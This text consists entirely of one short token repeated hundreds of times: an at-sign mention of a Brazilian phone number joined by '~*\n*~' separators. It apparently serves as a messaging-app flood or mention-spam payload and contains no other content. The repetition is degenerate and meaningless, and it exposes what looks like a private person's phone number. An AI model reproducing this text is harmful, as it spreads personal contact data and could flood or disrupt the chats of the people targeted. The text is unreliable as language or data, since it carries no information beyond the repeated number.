@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n